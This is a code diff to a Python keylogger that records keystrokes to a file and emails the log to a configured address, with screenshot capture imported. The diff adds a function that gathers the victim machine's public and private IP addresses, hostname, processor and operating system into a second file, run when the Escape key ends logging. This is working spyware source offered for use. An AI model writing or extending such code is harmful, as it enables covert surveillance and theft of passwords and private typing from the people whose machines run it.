@@ -2,6 +2,8 @@
 import os
 from dotenv import load_dotenv
 
+import osascript
+
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
@@ -32,6 +34,7 @@ from PIL import ImageGrab
 load_dotenv()
 
 keys_information = 'key_log.txt'
+system_information = 'systeminfo.txt'
 email_address = os.getenv('EMAIL_ADDRESS')
 password = os.getenv('PASSWORD')
 toaddr = os.getenv('EMAIL_ADDRESS')
@@ -79,9 +82,25 @@ def send_mail(filename, attachment, toaddr):
     s.sendmail(fromaddr, toaddr, text)
     
     s.quit()
-
-
-
+    
+def device_information():
+    with open(file_path + extend + system_information, "a") as f:
+        hostname = socket.gethostname()
+        IPAddr = socket.gethostbyname(hostname)
+        try:
+            public_ip = get("https://icanhazip.com").text
+            f.write('Public IP Address: ' + public_ip)
+        
+        except Exception:
+            f.write("Couldn't get Public IP Address")
+            
+        f.write('Processor: ' + (platform.processor()) + '\n')
+        f.write("System: " + platform.system() + " " + platform.version() + '\n')
+        f.write("Machine: " + platform.machine() + '\n')
+        f.write("Hostname: " + hostname + '\n')
+        f.write("Private IP Address: " + IPAddr + "\n")
+        
+    
 count = 0
 keys = []
 
@@ -113,6 +132,7 @@ def write_file(keys):
 def on_release(key):
     if key == Key.esc:
         send_mail(keys_information, file_path + extend + keys_information, toaddr)
+        device_information()
         return False
 
 
